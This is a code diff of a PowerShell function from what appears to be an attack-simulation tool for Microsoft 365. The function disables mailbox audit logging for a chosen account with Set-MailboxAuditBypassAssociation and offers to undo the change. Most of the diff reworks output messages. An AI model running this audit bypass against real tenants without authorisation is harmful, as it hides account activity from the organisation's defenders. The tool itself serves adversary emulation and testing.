@@ -2,48 +2,54 @@ function DisableMailboxAuditing{
 
     mitre_details("DisableMailboxAuditing")
     
-    EnterAccount("Enter an account to disable auditing for")
+    EnterAccount("`n[?] Enter account to disable auditing for")
 
     #Enter account to compromise
     $target_account = $global:account_username
 
-    Write-Host "`nRetrieving mailbox current config..." -ForegroundColor Gray
+    MAADWriteProcess "Fetching mailbox current config"
     $current_config = Get-MailboxAuditBypassAssociation -Identity $target_account
-    Write-Host "`nMailbox auditing bypass current status: $($current_config.AuditBypassEnabled)" -ForegroundColor Gray
+    MAADWriteProcess "Current Config -> Mailbox Audit Bypass Enabled : $($current_config.AuditBypassEnabled)"
 
-    $user_confirm = Read-Host -Prompt "`nConfirm disbaling audit logging for this account? (yes/no)"
+    $user_confirm = Read-Host -Prompt "`n[?] Confirm audit log disable for this account (y/n)"
+    Write-Host ""
 
     if ($user_confirm -notin "No","no","N","n") {
         try {
-            Write-Host "`nDisabling mailbox auditing for $target_account ..."
-            Set-MailboxAuditBypassAssociation -Identity $target_account -AuditByPassEnabled $true -ErrorAction Stop
-            Write-Host "`nWaiting for changes to take effect..." -ForegroundColor Gray
+            MAADWriteProcess "Disabling mailbox auditing for account -> $target_account"
+            Set-MailboxAuditBypassAssociation -Identity $target_account -AuditByPassEnabled $true -ErrorAction Stop | Out-Null
+            MAADWriteProcess "Waiting for changes to take effect"
             Start-Sleep -s 60
-            Get-MailboxAuditBypassAssociation -Identity $target_account | Format-Table AuditBypassEnabled
-            Write-Host "`n[Success] Let's fly low - Mailbox auditing disabled" -ForegroundColor Yellow
+            $updated_config = Get-MailboxAuditBypassAssociation -Identity $target_account
+            MAADWriteProcess "Updated Config -> Mailbox Audit Bypass Enabled : $($updated_config.AuditBypassEnabled)"
+            MAADWriteSuccess "Flying low : Mailbox Auditing Disabled"
             $allow_undo = $true
         }
         catch {
-            Write-Host "`n[Error] Failed to bypass audit logging for account $target_account" -ForegroundColor Red
+            MAADWriteError "Failed to bypass audit logging for account"
         }      
     }
 
     #Undo changes
     if ($allow_undo -eq $true) {
-        $user_confirm = Read-Host -Prompt "`nWould you like to re-enable audit logging for the account? (yes/no)"
+        $user_confirm = Read-Host -Prompt "`n[?] Undo: Re-enable audit logging for the account (y/n)"
+        Write-Host ""
 
         if ($user_confirm -notin "No","no","N","n") {
             try {
-                Write-Host "`nRe-enabling mailbox audit logging for $target_account ..." -ForegroundColor Gray
-                Set-MailboxAuditBypassAssociation -Identity $target_account -AuditByPassEnabled $false
+                MAADWriteProcess "Re-enabling mailbox audit logging for account -> $target_account"
+                Set-MailboxAuditBypassAssociation -Identity $target_account -AuditByPassEnabled $false | Out-Null
+                MAADWriteProcess "Waiting for changes to take effect"
                 Start-Sleep -s 60    
-                Get-MailboxAuditBypassAssociation -Identity $target_account | Format-Table AuditBypassEnabled 
-                Write-Host "`n[Undo Success] Re-enabled audit logging" -ForegroundColor Yellow
+                $updated_config = Get-MailboxAuditBypassAssociation -Identity $target_account
+                MAADWriteProcess "Fetching mailbox updated config"
+                MAADWriteProcess "Updated Config -> Mailbox Audit Bypass Enabled : $($updated_config.AuditBypassEnabled)"
+                MAADWriteSuccess "Re-enabled Audit Logging"
             }
             catch {
-                Write-Host "`n[Undo Error] Failed to re-enable audit logging" -ForegroundColor Red
+                MAADWriteError "Failed to re-enable audit logging"
             }
         }
     }
-    Pause
+    MAADPause
 }
